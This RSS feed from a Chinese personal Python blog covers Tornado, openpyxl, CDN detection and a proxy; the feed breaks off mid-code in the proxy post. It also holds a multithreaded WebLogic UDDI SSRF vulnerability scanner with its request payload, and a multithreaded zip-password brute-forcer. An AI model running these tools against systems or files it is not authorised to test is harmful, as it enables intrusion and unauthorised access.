<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Python on </title>
    <link>http://wyb0.com/topics/python/</link>
    <description>Recent content in Python on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Fri, 14 Apr 2017 14:43:52 +0800</lastBuildDate>
    <atom:link href="http://wyb0.com/topics/python/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>检测WebLogic是否存在SSRF</title>
      <link>http://wyb0.com/posts/weblogic-ssrf-check/</link>
      <pubDate>Fri, 14 Apr 2017 14:43:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/weblogic-ssrf-check/</guid>
      <description>

&lt;h3 id=&#34;0x00-检测脚本如下:9126f36678ee6a89ae5be2ddcd4f1837&#34;&gt;0x00 检测脚本如下&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python  
# -*- coding: utf-8 -*-

import re
import sys
import Queue
import requests
import threading

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

queue = Queue.Queue()
mutex = threading.Lock()

class Weblogic_SSRF_Check(threading.Thread):
    &amp;quot;&amp;quot;&amp;quot;docstring for Weblogic_SSRF_Check&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def check(self,domain,ip):
        payload = &amp;quot;uddiexplorer/SearchPublicRegistries.jsp?operator={ip}&amp;amp;rdoSearch=name&amp;amp;txtSearchname=sdf&amp;amp;txtSearchkey=&amp;amp;txtSearchfor=&amp;amp;selfor=Business+location&amp;amp;btnSubmit=Search&amp;quot;.format(ip=ip)
        url = domain + payload

        try:
            html = requests.get(url=url, timeout=15, verify=False).content

            m = re.search(&#39;weblogic.uddi.client.structures.exception.XML_SoapException&#39;,html)
            if m:
                mutex.acquire()
                with open(&#39;ssrf.txt&#39;,&#39;a+&#39;) as f:
                    print &amp;quot;%s has weblogic ssrf.&amp;quot; % domain
                    f.write(&amp;quot;%s has weblogic ssrf.\n&amp;quot; % domain)
                mutex.release()
        except Exception,e:
            pass

    def get_registry(self,domain):
        payload = &#39;uddiexplorer/SetupUDDIExplorer.jsp&#39;
        url = domain + payload

        try:
            html = requests.get(url=url, timeout=15, verify=False).content
            m = re.search(&#39;&amp;lt;i&amp;gt;For example: (.*?)/uddi/uddilistener.*?&amp;lt;/i&amp;gt;&#39;,html)
            if m:
                return m.group(1)
        except Exception,e:
            pass

    def run(self):
        while not self.queue.empty():
            domain = self.queue.get()
            mutex.acquire()
            print domain
            mutex.release()
            ip = self.get_registry(domain)
            self.check(domain,ip)

            self.queue.task_done()


if __name__ == &#39;__main__&#39;:
    with open(&#39;domain.txt&#39;,&#39;r&#39;) as f:
        lines = f.readlines()
    for line in lines:
        queue.put(line.strip())

    for x in xrange(1,50):
        t = Weblogic_SSRF_Check(queue)
        t.setDaemon(True)
        t.start()
    queue.join()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>初识Tornado</title>
      <link>http://wyb0.com/posts/%E5%88%9D%E8%AF%86Tornado/</link>
      <pubDate>Tue, 03 Jan 2017 18:43:27 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/%E5%88%9D%E8%AF%86Tornado/</guid>
      <description>

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/anime/anime003.jpg&#34; alt=&#34;命运石之门&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h3 id=&#34;0x00-简介:0785bb1a286a1008e1b91348220a27f6&#34;&gt;0x00 简介&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;Tornado是一个用Python写的相对简单的、不设障碍的Web服务器架构,用以处理上万的同时的
连接口,让实时的Web服务通畅起来。虽然跟现在的一些用Python写的Web架构相似,比如Django,
但Tornado更注重速度,能够处理海量的同时发生的流量。 
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-示例:0785bb1a286a1008e1b91348220a27f6&#34;&gt;0x01 示例&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;main.py代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import tornado.ioloop
import tornado.web

class IndexHandler(tornado.web.RequestHandler):
    def get(self):   #访问根时触发这个函数
        name = self.get_argument(&#39;name&#39;,&#39;wyb&#39;)
        self.write(&#39;Hello,&#39; + name)
        self.write(&#39;&amp;lt;br /&amp;gt;&amp;lt;a href=&amp;quot;/login&amp;quot;&amp;gt;login&amp;lt;/a&amp;gt;&#39;)

class MyLoginHandler(tornado.web.RequestHandler):
    def get(self):
        self.render(&#39;login.html&#39;)  
#若用户请求/login页面则将login.html发送给客户端，客户会看的一个登陆表单

    def post(self):   #当用户点击提交按钮是触发这个函数
        name = self.get_argument(&#39;name&#39;)   #接收表单的name
        password = self.get_argument(&#39;password&#39;)   #接收表单的password
        self.write(&amp;quot;you name is:%s\nyou password is:%s&amp;quot; % (name,password))


def get_app():
    handlers = [
        (r&amp;quot;/&amp;quot;,IndexHandler),    #代表请求/的都让IndexHandler处理
        (r&amp;quot;/login&amp;quot;,MyLoginHandler),    #表示请求/login页面的让MyLoginHandler处理
    ]
    app = tornado.web.Application(handlers=handlers)
    return app

if __name__ == &#39;__main__&#39;:
    app = get_app()
    app.listen(8888)
    tornado.ioloop.IOLoop.instance().start()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;login.html代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;form&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;form action=&amp;quot;/login&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;
        Name: &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;name&amp;quot;&amp;gt;&amp;lt;br /&amp;gt;
        Password: &amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;password&amp;quot;&amp;gt;&amp;lt;br /&amp;gt;
        &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;submit&amp;quot; value=&amp;quot;login&amp;quot;&amp;gt;
    &amp;lt;/form&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-结果如下:0785bb1a286a1008e1b91348220a27f6&#34;&gt;0x03 结果如下&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tornado_test1.png&#34; alt=&#34;初识tornado1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tornado_test2.png&#34; alt=&#34;初识tornado2&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tornado_test3.png&#34; alt=&#34;初识tornado3&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python实现CDN的判断</title>
      <link>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0CDN%E7%9A%84%E5%88%A4%E6%96%AD/</link>
      <pubDate>Fri, 23 Dec 2016 21:10:05 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0CDN%E7%9A%84%E5%88%A4%E6%96%AD/</guid>
      <description>

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/anime/anime002.jpg&#34; alt=&#34;银魂&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h3 id=&#34;0x00-什么是cdn:d1a4b4dae5b2cfc1df372c64e29e9ea6&#34;&gt;0x00 什么是CDN&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;CDN的全称是Content Delivery Network，即内容分发网络。主要功能是在不同地点缓存内容，
运营商会在全国各地的节点上缓存你的网站网页，通过负载均衡技术，将用户的请求定向到最合适的
缓存服务器上去获取内容，比如说你是上海用户，你访问www.aa.com就会被重定向到上海的节点，
你是北京用户，你也访问www.aa.com，但是你会被重定向到上海的节点。
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-判断方法:d1a4b4dae5b2cfc1df372c64e29e9ea6&#34;&gt;0x01 判断方法&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;可以查询CNAME记录，每个cdn厂商都有特有的特征串&lt;/li&gt;
&lt;li&gt;查看http返回头的头部信息&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x02-代码:d1a4b4dae5b2cfc1df372c64e29e9ea6&#34;&gt;0x02 代码&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;首先安装dnspython这个第三方模块：pip install dnspython&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import dns.resolver
import urllib2
import urlparse

class CdnCheck(object):
    def __init__(self, url):
        super(CdnCheck, self).__init__()
        self.cdninfo()
        self.url = url
        self.cnames = []
        self.headers = []

    def get_cnames(self): # get all cname
        furl = urlparse.urlparse(self.url)
        url = furl.netloc
        # print url

        rsv = dns.resolver.Resolver()
        # rsv.nameservers = [&#39;114.114.114.114&#39;]
        try:
            answer = dns.resolver.query(url,&#39;CNAME&#39;)
        except Exception as e:
            self.cnames = None
            # print &amp;quot;ERROR: %s&amp;quot; % e
        else:
            cname = [_.to_text() for _ in answer][0]
            self.cnames.append(cname)
            self.get_cname(cname)

    def get_cname(self,cname): # get cname
        try:
            answer = dns.resolver.query(cname,&#39;CNAME&#39;)
            cname = [_.to_text() for _ in answer][0]
            self.cnames.append(cname)
            self.get_cname(cname)
        except dns.resolver.NoAnswer:
            pass

    def get_headers(self): # get header
        try:
            resp = urllib2.urlopen(self.url)
        except Exception as e:
            self.headers = None
            # print &amp;quot;ERROR: %s&amp;quot; % e
        else:
            headers = str(resp.headers).lower()
            self.headers = headers

    def matched(self, context, *args): # Matching string 
        if not isinstance(context, basestring):
            context = str(context)

        func = lambda x, y: y in x
        # if any(func(context, pattern) for pattern in args):
        #     return True
        # else:
        #     return False
        for pattern in args:
            if func(context,pattern):
                return pattern
        return False

    def check(self):
        flag = None
        self.get_cnames()
        self.get_headers()
        if self.cnames:
            # print self.cnames
            flag = self.matched(self.cnames,*self.cdn[&#39;cname&#39;])
            if flag:
                return {&#39;Status&#39;:True, &#39;CDN&#39;:self.cdn[&#39;cname&#39;].get(flag)}
        if not flag and self.headers:
            flag = self.matched(self.headers,*self.cdn[&#39;headers&#39;])
            if flag:
                return {&#39;Status&#39;:True, &#39;CDN&#39;:&#39;unknown&#39;}
        return {&#39;Status&#39;:False, &#39;CNAME&#39;:self.cnames, &#39;Headers&#39;:self.headers}

    def cdninfo(self):
        self.cdn = {
            &#39;headers&#39;: set([
                &#39;via&#39;,
                &#39;x-via&#39;,
                &#39;by-360wzb&#39;,
                &#39;by-anquanbao&#39;,
                &#39;cc_cache&#39;,
                &#39;cdn cache server&#39;,
                &#39;cf-ray&#39;,
                &#39;chinacache&#39;,
                &#39;verycdn&#39;
                &#39;webcache&#39;,
                &#39;x-cacheable&#39;,
                &#39;x-fastly&#39;,
                &#39;yunjiasu&#39;,
            ]),
            &#39;cname&#39;: {
                &#39;tbcache.com&#39;:u&#39;taobao&#39;, # 应该是淘宝自己的。。。。
                &#39;tcdn.qq.com&#39;:u&#39;tcdn.qq.com&#39;, # 应该是腾讯的。。。
                &#39;00cdn.com&#39;:u&#39;XYcdn&#39;, # 星域cdn
                &#39;21cvcdn.com&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;21okglb.cn&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;21speedcdn.com&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;21vianet.com.cn&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;21vokglb.cn&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;360wzb.com&#39;:u&#39;360&#39;, # 360网站卫士
                &#39;51cdn.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;acadn.com&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;aicdn.com&#39;:u&#39;UPYUN&#39;, # 又拍云
                &#39;akadns.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;akamai-staging.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;akamai.com&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;akamai.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;akamaitech.net&#39;:u&#39;Akamai&#39;, # 易通锐进
                &#39;akamaized.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;alicloudlayer.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;alikunlun.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;aliyun-inc.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;aliyuncs.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;amazonaws.com&#39;:u&#39;Amazon Cloudfront&#39;, # 亚马逊
                &#39;anankecdn.com.br&#39;:u&#39;Ananke&#39;, # Ananke
                &#39;aodianyun.com&#39;:u&#39;VOD&#39;, # 奥点云
                &#39;aqb.so&#39;:u&#39;AnQuanBao&#39;, # 安全宝
                &#39;awsdns&#39;:u&#39;KeyCDN&#39;, # KeyCDN
                &#39;azioncdn.net&#39;:u&#39;Azion&#39;, # Azion
                &#39;azureedge.net&#39;:u&#39;Azure CDN&#39;, # Microsoft Azure
                &#39;bdydns.com&#39;:u&#39;Baiduyun&#39;, # 百度云
                &#39;bitgravity.com&#39;:u&#39;Tata Communications&#39;, # 待定
                &#39;cachecn.com&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;cachefly.net&#39;:u&#39;Cachefly&#39;, # Cachefly
                &#39;ccgslb.com&#39;:u&#39;ChinaCache&#39;, # 蓝汛科技
                &#39;ccgslb.net&#39;:u&#39;ChinaCache&#39;, # 蓝汛科技
                &#39;cdn-cdn.net&#39;:u&#39;&#39;, # 待定
                &#39;cdn.cloudflare.net&#39;:u&#39;CloudFlare&#39;, # CloudFlare
                &#39;cdn.dnsv1.com&#39;:u&#39;Tengxunyun&#39;, # 腾讯云
                &#39;cdn.ngenix.net&#39;:u&#39;&#39;, # 待定
                &#39;cdn20.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;cdn77.net&#39;:u&#39;CDN77&#39;, # CDN77
                &#39;cdn77.org&#39;:u&#39;CDN77&#39;, # CDN77
                &#39;cdnetworks.net&#39;:u&#39;CDNetworks&#39;, # 同兴万点
                &#39;cdnify.io&#39;:u&#39;CDNify&#39;, # CDNify
                &#39;cdnnetworks.com&#39;:u&#39;CDNetworks&#39;, # 同兴万点
                &#39;cdnsun.net&#39;:u&#39;CDNsun&#39;, # CDNsun
                &#39;cdntip.com&#39;:u&#39;QCloud&#39;, # 腾讯云
                &#39;cdnudns.com&#39;:u&#39;PowerLeader&#39;, # 宝腾互联
                &#39;cdnvideo.ru&#39;:u&#39;CDNvideo&#39;, # CDNvideo
                &#39;cdnzz.net&#39;:u&#39;SuZhi&#39;, # 速致
                &#39;chinacache.net&#39;:u&#39;ChinaCache&#39;, # 蓝汛科技
                &#39;chinaidns.net&#39;:u&#39;LineFuture&#39;, # 澜景网络
                &#39;chinanetcenter.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;cloudcdn.net&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;cloudfront.net&#39;:u&#39;Amazon Cloudfront&#39;, # Amazon
                &#39;customcdn.cn&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;customcdn.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;dnion.com&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;dnspao.com&#39;:u&#39;&#39;, # 待定
                &#39;edgecastcdn.net&#39;:u&#39;EdgeCast&#39;, # EdgeCast
                &#39;edgesuite.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;ewcache.com&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;fastcache.com&#39;:u&#39;FastCache&#39;, # 速网科技
                &#39;fastcdn.cn&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;fastly.net&#39;:u&#39;Fastly&#39;, # Fastly
                &#39;fastweb.com&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;fastwebcdn.com&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;footprint.net&#39;:u&#39;Level3&#39;, # Level3
                &#39;fpbns.net&#39;:u&#39;Level3&#39;, # Level3
                &#39;fwcdn.com&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;fwdns.net&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;globalcdn.cn&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;hacdn.net&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;hadns.net&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;hichina.com&#39;:u&#39;WWW&#39;, # 万网
                &#39;hichina.net&#39;:u&#39;WWW&#39;, # 万网
                &#39;hwcdn.net&#39;:u&#39;Highwinds&#39;, # Highwinds
                &#39;incapdns.net&#39;:u&#39;Incapsula&#39;, # Incapsula
                &#39;internapcdn.net&#39;:u&#39;Internap&#39;, # Internap
                &#39;jiashule.com&#39;:u&#39;Jiasule&#39;, # 加速乐
                &#39;kunlun.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;kunlunar.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;kunlunca.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;kxcdn.com&#39;:u&#39;KeyCDN&#39;, # KeyCDN
                &#39;lswcdn.net&#39;:u&#39;Leaseweb&#39;, # Leaseweb
                &#39;lxcdn.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;lxdns.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;mwcloudcdn.com&#39;:u&#39;QUANTIL&#39;, # QUANTIL
                &#39;netdna-cdn.com&#39;:u&#39;MaxCDN&#39;, # MaxCDN
                &#39;okcdn.com&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;okglb.com&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;ourwebcdn.net&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;ourwebpic.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;presscdn.com&#39;:u&#39;Presscdn&#39;, # Presscdn
                &#39;qingcdn.com&#39;:u&#39;&#39;, # 待定
                &#39;qiniudns.com&#39;:u&#39;QiNiu&#39;, # 七牛云
                &#39;skyparkcdn.net&#39;:u&#39;&#39;, # 待定
                &#39;speedcdns.com&#39;:u&#39;QUANTIL&#39;, # QUANTIL
                &#39;sprycdn.com&#39;:u&#39;PowerLeader&#39;, # 宝腾互联
                &#39;tlgslb.com&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;txcdn.cn&#39;:u&#39;CDNetworks&#39;, # 同兴万点
                &#39;txnetworks.cn&#39;:u&#39;CDNetworks&#39;, # 同兴万点
                &#39;ucloud.cn&#39;:u&#39;UCloud&#39;, # UCloud
                &#39;unicache.com&#39;:u&#39;LineFuture&#39;, # 澜景网络
                &#39;verygslb.com&#39;:u&#39;VeryCloud&#39;, # 云端网络
                &#39;vo.llnwd.net&#39;:u&#39;Limelight&#39;, # Limelight
                &#39;wscdns.com&#39;:u&#39;ChinaNetCenter&#39;, # 网宿科技
                &#39;wscloudcdn.com&#39;:u&#39;ChinaNetCenter&#39;, # 网宿科技
                &#39;xgslb.net&#39;:u&#39;Webluker&#39;, # WebLuker
                &#39;ytcdn.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;yunjiasu-cdn&#39;:u&#39;Baiduyun&#39;, # 百度云加速
            }
        }


if __name__ == &#39;__main__&#39;:
    # url = &amp;quot;http://www.reber-9.com&amp;quot;
    url = sys.argv[1]
    cdn = CdnCheck(url)
    print cdn.check()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-结果:d1a4b4dae5b2cfc1df372c64e29e9ea6&#34;&gt;0x03 结果&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;结果如下：
C:\Users\WYB_9\Desktop&amp;gt;python check_cdn.py http://www.reber-9.com
{&#39;Status&#39;: True, &#39;CDN&#39;: u&#39;Baiduyun&#39;}

C:\Users\WYB_9\Desktop&amp;gt;python check_cdn.py http://v.ifeng.com
{&#39;Status&#39;: True, &#39;CDN&#39;: u&#39;ChinaCache&#39;}
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python的openpyxl模块</title>
      <link>http://wyb0.com/posts/python-module-openpyxl/</link>
      <pubDate>Fri, 25 Nov 2016 17:44:23 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-module-openpyxl/</guid>
      <description>

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/anime/anime001.jpg&#34; alt=&#34;夏目友人帐&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h3 id=&#34;0x00-openpyxl模块:066a934ccd3d0cfd20fcce987317e4e0&#34;&gt;0x00 openpyxl模块&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;这个模块可以让你读写excel文件
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-读取数据:066a934ccd3d0cfd20fcce987317e4e0&#34;&gt;0x01 读取数据&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/openpyxl_excel.png&#34; alt=&#34;excel数据&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;
代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

from openpyxl import load_workbook

wb = load_workbook(filename=&#39;aa.xlsx&#39;)

sheetnames = wb.get_sheet_names() #获得所有表名
print u&amp;quot;存在表：%s&amp;quot; % sheetnames

ws = wb.get_sheet_by_name(sheetnames[0])
print u&amp;quot;第一张表表名为：%s&amp;quot; % ws.title  #Sheet1
rows = ws.max_row  #行数
columns = ws.max_column  #列数
print &amp;quot;表%s有%d行%d列&amp;quot; % (ws.title,rows,columns)  #10 2  共10行2列


print
print u&amp;quot;取部分数据：&amp;quot;
print ws[&#39;A1&#39;].value,ws[&#39;B1&#39;].value  
print ws[&#39;A2&#39;].value,ws[&#39;B2&#39;].value
print ws.cell(row=1, column=2).value

print u&amp;quot;\n输出表%s的所有数据：&amp;quot; % ws.title
for x in range(1,rows+1):
    for y in range(1,columns+1):
        print ws.cell(row=x,column=y).value,&#39;\t&#39;,
    print
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;结果如下：

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/openpyxl_result.png&#34; alt=&#34;excel数据提取结果&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-写入数据:066a934ccd3d0cfd20fcce987317e4e0&#34;&gt;0x02 写入数据&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

from openpyxl import Workbook

wb = Workbook()

# 建表
ws1 = wb.active # 第一张表需要这样写，代表从第一张表开始
ws1.title = &#39;s1&#39;
ws2 = wb.create_sheet(title=&#39;s2&#39;)
ws3 = wb.create_sheet(title=&#39;s3&#39;)

# 写入数据
ws1[&#39;A1&#39;] = 1111
ws1[&#39;A2&#39;] = 2222
ws1[&#39;A3&#39;] = 3333
ws2[&#39;A1&#39;] = &#39;ssssssssss&#39;
ws2[&#39;B1&#39;] = &#39;dddddddddd&#39;
for x in range(1,4):
    for y in range(1,8):
        v = int(str(x)+str(y))
        _ = ws3.cell(column=x,row=y,value=v)

wb.save(filename=&#39;test.xlsx&#39;) # 保存数据
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;结果如下：

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/openpyxl_write.png&#34; alt=&#34;向excel写入数据&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python爆破zip压缩包</title>
      <link>http://wyb0.com/posts/Python%E7%88%86%E7%A0%B4zip%E5%8E%8B%E7%BC%A9%E5%8C%85/</link>
      <pubDate>Tue, 20 Sep 2016 14:50:59 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E7%88%86%E7%A0%B4zip%E5%8E%8B%E7%BC%A9%E5%8C%85/</guid>
      <description>

&lt;h3 id=&#34;0x00-代码:b937e6266634cef75fcb51fa109b76e7&#34;&gt;0x00 代码&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;多线程爆破加密的zip压缩包&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import optparse
import zipfile
import threading
import Queue

queue = Queue.Queue()
lock = threading.Lock()
result = &#39;&#39;

def load_pwd(filename):
    for line in open(filename,&#39;r&#39;):
        if line:
            queue.put(line.strip())

def bruter(zipname,queue):
    global result
    zFile = zipfile.ZipFile(zipname)
    while not queue.empty():
        password = queue.get()
        try:
            zFile.extractall(pwd=password) # 解压
            lock.acquire()
            print &amp;quot;[Ok] password is: %s&amp;quot; % password
            lock.release()
            result = password
        except:
            lock.acquire()
            print &amp;quot;[Error] password not is: %s&amp;quot; % password
            lock.release()
        queue.task_done()

def main():
    parser = optparse.OptionParser()
    parser.add_option(&#39;-f&#39;, &#39;--file&#39;, dest=&#39;zipfile&#39;,
        type=&#39;string&#39;, help=&#39;Target zip file.&#39;)
    parser.add_option(&#39;-p&#39;, &#39;--pfile&#39;, dest=&#39;pwdfile&#39;,default=&#39;pass.txt&#39;,
        type=&#39;string&#39;, help=&#39;Password file.&#39;)
    parser.add_option(&#39;-t&#39;, &#39;--thread_num&#39;, dest=&#39;thread_num&#39;,default=60,
        type=&#39;int&#39;, help=&#39;Thread number.&#39;)

    (options, args) = parser.parse_args()

    if options.zipfile and options.pwdfile:
        load_pwd(options.pwdfile)
    else:
        parser.print_help()
        sys.exit(0)

    threads = []
    for x in range(options.thread_num):
        t = threading.Thread(target=bruter,args=(options.zipfile,queue,))
        t.setDaemon(True)
        t.start()
    queue.join()
    print &amp;quot;result is: %s&amp;quot; % result

if __name__ == &#39;__main__&#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python实现代理</title>
      <link>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86/</link>
      <pubDate>Tue, 13 Sep 2016 11:36:39 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86/</guid>
      <description>

&lt;h2 id=&#34;帮助信息:1c8d1e1a6033af5d70b3fcb50e371dd2&#34;&gt;帮助信息&lt;/h2&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/python_proxy_help.png&#34; alt=&#34;帮助信息&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h2 id=&#34;代码如下:1c8d1e1a6033af5d70b3fcb50e371dd2&#34;&gt;代码如下&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

&#39;This is a proxy&#39;

__author__ = &#39;xxx&#39;

import sys
import socket
import threading
import optparse

lock = threading.Lock()

def locker(msg):
    lock.acquire()
    print msg
    lock.release()

def hexdump (src,length=16):#十六进制导出函数
    result = []
    digits = 4 if isinstance(src,unicode) else 2

    for i in xrange(0,len(src),length):
        s = src[i:i+length]
